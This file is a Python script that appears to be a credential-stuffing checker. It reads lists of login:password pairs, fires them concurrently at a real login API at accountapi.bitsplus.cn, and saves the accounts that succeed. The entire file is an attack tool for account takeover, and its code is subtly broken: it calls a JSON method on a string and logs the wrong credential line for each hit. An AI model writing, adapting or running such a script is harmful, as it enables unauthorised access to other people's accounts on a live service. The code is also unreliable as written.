
#pip install aiohttp
#pip install cchardet
#pip install aiodns

import asyncio
import aiohttp
import time

async def request(session, url, data):
    async with session.post(url=url, data=data) as response:
        result = await response.text()
        return result

async def test():
    start_time = time.time()

    with open("output.txt", "w") as output_file:
        output_file.truncate()

    with open('input.txt') as input_file:
        lines = [line.rstrip() for line in input_file if len(line) > 1] #[0:10]

    async with aiohttp.ClientSession() as session:
        tasks = []
        for line in lines:
            login = line.split(':')[0]
            password = line.split(':')[1]
            print(login, password)
            data = {
                'mail': f'{login}',
                'passwd': f'{password}',
                'sign': '4bcb3f3cfce02ba293ef98fda67b8683a3d3678637c04ea620f52508b6cf94c0'
            }
            #print(data)
            url = 'https://accountapi.bitsplus.cn/user/login'
            tasks.append(asyncio.ensure_future(request(session, url, data)))

        responses = await asyncio.gather(*tasks)

        for response in responses:
            if 'user_id' in response:
                print(response)
                user_id = response.json()['data']['user_id']
                with open("output.txt", "a") as output_file:
                    output_file.write(f'user_id:{user_id}:{line}')
                    # output_file.write(f'{login} {password}')

    print("\n--- %s seconds ---" % (time.time() - start_time))